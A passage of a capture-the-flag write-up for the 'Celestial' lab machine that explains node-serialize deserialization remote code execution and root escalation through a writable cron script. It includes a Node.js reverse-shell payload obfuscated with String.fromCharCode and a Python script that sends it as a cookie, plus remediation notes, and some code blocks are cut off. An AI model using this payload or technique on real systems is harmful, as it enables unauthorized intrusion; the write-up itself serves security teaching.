Time to look at what deserialization library Node.js apps typically use - and whether it's exploitable.</p><h2 id="4-understanding-the-vulnerability">4. Understanding the Vulnerability</h2><p>What is deserialization?</p><p>Serialization = converting a data structure (like a JavaScript object) into a storable string format (like JSON).</p><p>Deserialization = the reverse: converting that string back into a live object in memory.</p><p>The danger is when a deserialization library is designed to also reconstruct functions, not just data. If an attacker can inject a function into the serialized data, and the server executes it during deserialization - that's Remote Code Execution (RCE).</p><p>The node-serialize library</p><p>The server.js source code (found later on the box) reveals:</p><p>Var serialize = require('node-serialize');<br>var obj = serialize.unserialize(str);</p><p>The node-serialize library supports serializing JavaScript functions using a special marker: _$$ND_FUNC$$_. When it deserializes a string containing this marker, it reconstructs the function.</p><p>The critical flaw: if the function is immediately invoked (an IIFE - Immediately Invoked Function Expression), it executes at deserialization time. The syntax for an IIFE is wrapping the function body in ():</p><p>// Normal function (stored but not called):<br>{"rce":"_$$ND_FUNC$$_function(){&nbsp;… }"}</p><p>// IIFE (executes immediately on deserialization):<br>{"rce":"_$$ND_FUNC$$_function(){&nbsp;… }()"}</p><p>Notice the () at the end before the closing ". That's the trigger.</p><p>Why this is dangerous</p><p>The server calls serialize.unserialize(cookie) on every request. If we craft a cookie that contains a function with () at the end, the function executes on the server with the server's privileges (in this case, running as user sun).</p><p>The library was designed to serialize functions for legitimate use. The developer using it for user-facing cookie data didn't realize they were handing attackers a code execution primitive. This is a classic case of using a powerful library unsafely.</p><h2 id="5-crafting-the-exploit">5. Crafting the Exploit</h2><p>The plan</p><p>We need to:<br>1. Write a Node.js reverse shell (code that connects back to our machine)<br>2. Encode it to avoid bad characters<br>3. Wrap it in the node-serialize IIFE payload format<br>4. Base64-encode the whole thing (cookie format)<br>5. Send it as the profile cookie</p><p>The reverse shell logic</p><p>A reverse shell makes the target connect to us, rather than us connecting to the target. This bypasses firewalls that block inbound connections but allow outbound ones.</p><p>The Node.js reverse shell:</p><pre tabindex="0" aria-label="javascript code or terminal block 1"><code data-language="javascript">var net = require('net');

&nbsp;var sh = spawn('/bin/sh',[]);

&nbsp;sh.stdout.pipe(client);

By encoding every character as its decimal ASCII value and using String.fromCharCode() to reconstruct the string at runtime, we avoid any character issues.</p><p>Eval(String.fromCharCode(10,118,97,114,…))</p><p>This is a common obfuscation technique - the actual JS code is hidden as numbers, reconstructed and executed at runtime.</p><p>The full exploit script</p><p>Celestial_exploit.py</p><p>Import base64<br>import requests</p><p>LHOST = "10.10.16.84"<br>LPORT = "4444"</p><p>Js_payload = f"""<br>var net = require('net');<br>var spawn = require('child_process').spawn;<br>HOST="{LHOST}";<br>PORT="{LPORT}";<br>…<br>"""</p><p># Encode each character as its ASCII decimal value<br>char_codes = ",".join(str(ord(c)) for c in js_payload)<br>encoded_js = f"eval(String.fromCharCode({char_codes}))"</p><p># Wrap in IIFE format - the () at the end triggers execution<br>serialized = '{{"rce":"_$$ND_FUNC$$_function(){{{encoded_js}}}()"}}'.format(…)</p><p># Base64 encode for the cookie<br>cookie_value = base64.b64encode(serialized.encode()).decode()</p><p># Send the request - server deserializes cookie → executes function → reverse shell<br>requests.get("<span class="article-lab-address">http://10.129.228.94:3000/<span> (lab-only address)</span></span>", headers={"Cookie": f"profile={cookie_value}"})</p><p>What happens server-side</p><p>1. Review notes</h2><p>Vulnerability 1: Node.js Deserialization (CVE-2017-5941)</p><p>Root cause: The node-serialize library can serialize/deserialize JavaScript functions. When user-controlled data is passed directly to unserialize(), an attacker can inject an IIFE that executes on the server.</p><p>Fix: Never deserialize user-controlled data. If you must store state client-side, use signed/encrypted JWTs instead of raw serialized objects. Do not use node-serialize on untrusted input.</p><p>Real-world relevance: Deserialization bugs exist in Java (Apache Commons Collections), Python (pickle), PHP (unserialize), Ruby (Marshal), and more. The class of vulnerability is language-agnostic - it's about trusting the format of user input too much.</p><p>Vulnerability 2: Cron Job with Writable Script</p><p>Root cause: A root-owned cron job executes a script file that is writable by a low-privileged user. The privilege boundary between the process (root) and the file it executes (user-writable) is broken.</p><p>Fix: Scripts executed by privileged cron jobs must be owned by root and not writable by other users. Use chmod 700 script.py &amp;&amp; chown root:root script.py.</p><p>Real-world relevance: This pattern appears constantly in misconfigured Linux servers - backup scripts, monitoring scripts, cleanup scripts all running as root but placed in user-writable directories.</p><h2 id="attack-path-summary">Attack path summary</h2><p>- Nmap: Port 3000, Node.js Express<br>&nbsp;Question: What does the web app do?<br>&nbsp;Action: Browse/curl it</p><p>- Cookie: Base64 JSON in cookie<br>&nbsp;Question: What does the server do with this?<br>&nbsp;Action: Decode it, tamper with it</p><p>- Deserialization: node-serialize + user data<br>&nbsp;Question: Can I inject executable code?<br>&nbsp;Action: Craft IIFE payload</p><p>- Shell as sun: Home dir has script.py, output.txt owned by root<br>&nbsp;Question: Is a cron job running this?<br>&nbsp;Action: Check timestamps, wait</p><p>- Cron confirmed: script.py runs as root, but sun owns it<br>&nbsp;Question: Can I overwrite it?<br>&nbsp;Action: Replace with reverse shell</p><p>- Root shell: uid=0<br>&nbsp;Action: Get the flag with cat /root/root.txt</p><h2 id="tools-used">Tools Used</h2><p>- nmap - Port scanning and service detection<br>- curl - HTTP requests and header inspection<br>- base64 - Encode/decode cookie values<br>- python3 - Exploit scripting<br>- nc (netcat) - Reverse shell listener<br>- echo - Write malicious script to disk</p><p>Celestial - Rooted.
